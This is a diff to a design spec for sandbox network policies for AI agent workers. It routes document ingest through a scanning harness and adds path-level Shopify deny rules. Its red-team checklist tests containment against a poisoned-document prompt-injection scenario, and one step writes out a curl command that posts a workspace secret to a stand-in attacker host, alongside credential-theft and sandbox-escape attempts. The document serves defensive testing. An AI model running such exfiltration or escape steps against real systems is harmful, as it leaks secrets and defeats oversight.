@@ -47,7 +47,21 @@ Each entry: `endpoints` (list, **required**) + `binaries` (list, **required**).
 
 ## 3. Draft — `worker-research.yaml` (corrected to real schema)
 
-Research worker: Apify (trending shoes) + Nemotron inference. Read-mostly. No Shopify.
+Research worker: Nemotron inference + **harness-brokered** document ingest. Read-mostly. No Shopify.
+
+> **Ingest is harness-brokered, not a sandbox egress (design decision).** Earlier
+> drafts allowlisted `api.apify.com` directly from the research sandbox. That breaks
+> the poisoned-doc demo's Layer 1: a document the worker fetches *from inside* the
+> sandbox never passes through the harness `scan("ingested_document")`, so HiddenLayer
+> never sees it. Instead the worker calls a harness-side ingest tool → the Factory/
+> dispatcher performs the Apify fetch, runs `scan()`, and returns the (clean-or-flagged)
+> text into the sandbox. Same broker pattern as CEO spawn (`ceo-sandbox.spec.md` §2a):
+> the dangerous egress lives on a narrow, gate-instrumented host choke point, not in
+> the most-targeted sandbox. Net effect: the research sandbox's own egress allowlist
+> is **inference-only**, and default-deny still independently blocks the `evil.example`
+> exfil (Layer 2). Capability is unchanged — the worker still drives research; it just
+> can't fetch un-scanned bytes. Cross-ref `nemoclaw-spawn.spec.md` §6.1,
+> `poisoned-doc-demo.spec.md` §2.
 
 ```yaml
 version: 1
@@ -69,24 +83,28 @@ landlock:
   compatibility: best_effort
 
 network_policies:
-  apify_api:
-    name: apify-api
+  # NO apify endpoint here — Apify ingest is harness-brokered (see note above), so
+  # the research sandbox never fetches external documents itself. This is the point:
+  # every ingested doc is forced through the harness gate, and the sandbox's only
+  # egress is inference.
+  nvidia_inference:
+    name: nvidia-inference
     endpoints:
-      - host: api.apify.com
+      # ONLY needed if routed inference does NOT exit via the localhost gateway.
+      # Confirm at onboarding (open item §6). If it exits via gateway, delete this
+      # whole entry and the sandbox has zero direct egress (strongest default-deny).
+      - host: integrate.api.nvidia.com
         port: 443
         protocol: rest
         enforcement: enforce
-        access: read-write          # POST to start actor runs, GET results
-        request_body_credential_rewrite: true   # token as openshell:resolve:env:APIFY_TOKEN
+        access: read-write
+        request_body_credential_rewrite: true   # nvapi key as openshell:resolve:env:NVIDIA_API_KEY
     binaries:
       - path: /usr/local/bin/openclaw
       - path: /usr/bin/node
-  # NOTE: NVIDIA inference egress — confirm whether routed inference exits via the
-  # gateway (localhost, no policy entry needed) or the sandbox must allowlist
-  # integrate.api.nvidia.com:443 directly. Open item §6.
 ```
 
-Everything else (incl. `evil.example`) → default-deny.
+Everything else (incl. `api.apify.com` from inside the sandbox, and `evil.example`) → default-deny.
 
 ---
 
@@ -121,14 +139,49 @@ network_policies:
         port: 443
         protocol: rest
         enforcement: enforce
-        access: read-write            # POST/PUT products, collections
+        # Path-level rules instead of a blunt `access: read-write` — this is the
+        # "non-trivial policy" the bounty rewards (allow-with-boundary, not a global
+        # allow). `access` is mutually exclusive with `rules`, so it is omitted.
+        # deny_rules take precedence over rules (schema §2).
+        rules:
+          # StoreBuilder's job: create/update catalog. Nothing else.
+          - methods: [GET, POST, PUT]
+            path: /admin/api/*/products*
+          - methods: [GET, POST, PUT]
+            path: /admin/api/*/collections*
+          - methods: [GET, POST]
+            path: /admin/api/*/inventory_levels*
+        deny_rules:
+          # PII / financial boundary INSIDE an allowed host — the agent has a live
+          # write token and still cannot touch customers or orders. This is the line
+          # judges can test under pressure: it holds even if the agent is compromised.
+          - path: /admin/api/*/customers*
+          - path: /admin/api/*/orders*
+          - path: /admin/api/*/price_rules*
+          - path: /admin/api/*/gift_cards*
         request_body_credential_rewrite: true   # X-Shopify-Access-Token via openshell:resolve:env:SHOPIFY_TOKEN
+      # Graduated enforcement: fulfillment is read-only AND audit-mode (log, don't
+      # block) — shows the policy makes judgments, not one global switch.
+      - host: "*.myshopify.com"
+        port: 443
+        protocol: rest
+        enforcement: audit
+        rules:
+          - methods: [GET]
+            path: /admin/api/*/fulfillment_orders*
+        request_body_credential_rewrite: true
     binaries:
       - path: /usr/local/bin/openclaw
       - path: /usr/bin/node
 ```
 
 No Apify endpoint → StoreBuilder cannot reach Apify (least privilege per role).
+
+> **Open item (schema-confirm):** the exact `rules` / `deny_rules` sub-shape
+> (`methods` + `path`? `path` glob syntax?) is not spelled out in the schema table §2 —
+> confirm field names against `openshell policy validate` at onboarding. The *design*
+> (allow products/collections, deny customers/orders/price at path granularity, one
+> audit endpoint) is the point; the exact keys may need a tweak.
 
 ---
 
@@ -139,6 +192,7 @@ From inside each sandbox (`nemoclaw <role> connect`), attempt and confirm each i
 1. **Exfil to arbitrary host:** `curl -X POST https://evil.example -d @/workspace/secret` → blocked (default-deny egress). This is the poisoned-doc demo's independent block.
 2. **Wrong-API access:** from StoreBuilder, hit `api.apify.com` → blocked (not in its allowlist).
 3. **Method escalation:** on a `read-only` endpoint, attempt `POST`/`DELETE` → blocked.
+3b. **PII boundary inside an allowed host (the non-trivial-policy proof):** from StoreBuilder, with a valid write token, `GET/POST *.myshopify.com/admin/api/2024-01/customers.json` and `.../orders.json` → blocked by `deny_rules` even though the host and token are allowed. Then `POST .../products.json` → allowed. This is the demo-able "it knows how, it has the token, it still can't" line.
 4. **Credential theft:** print env / read files looking for the raw `SHOPIFY_TOKEN`/`APIFY_TOKEN` → agent only ever sees the `openshell:resolve:env:*` placeholder, real token injected at gateway. Confirm raw token absent in sandbox.
 5. **Filesystem escape:** write to `/usr/lib`, `/etc`, or `..` outside workspace → blocked (static fs policy + landlock).
 6. **Privilege escalation:** attempt `run_as root` / sudo → blocked (`process.run_as_user: sandbox`, root forbidden).
@@ -155,3 +209,6 @@ Log each attempt+result → feeds the "defense in depth, on screen" demo narrati
 - [ ] Whether `nemoclaw onboard` takes a `--policy <file>` for the static sections, or static policy is authored separately then sandbox created against it. Affects Phase A wiring (cross-ref `nemoclaw-spawn.spec.md` §8).
 - [ ] Confirm `*.myshopify.com` wildcard resolves to the specific dev store, or pin the exact store host.
 - [ ] Validate each YAML with any `openshell policy validate` / lint before demo.
+- [ ] Exact `rules` / `deny_rules` sub-shape (`methods` + `path`? glob syntax?) — see §4 note. Needed for the Shopify PII-boundary policy.
+- [ ] **HiddenLayer-in-egress stretch:** does `network_middlewares` (dynamic, `fail_closed`, max 10) let an egress hook call the HiddenLayer Runtime API inline? If yes, in-sandbox tool_call / tool_result get scanned without a harness round-trip — closes the last instrumentation gap (`nemoclaw-spawn.spec.md` §6.1). Confirm feasibility; do NOT put it on the demo critical path.
+- [ ] **Inference credential must be a placeholder in-sandbox.** `nemoclaw-spawn.spec.md` §2 puts `NVIDIA_API_KEY` in the host `.env`. Confirm the routed-inference key reaches the sandbox as `openshell:resolve:env:NVIDIA_API_KEY` (rewrite), NOT as a raw `nvapi-...` in sandbox env — otherwise the poisoned-doc credential-hygiene test (`poisoned-doc-demo.spec.md` §5.5) fails and there IS a real secret to exfil.
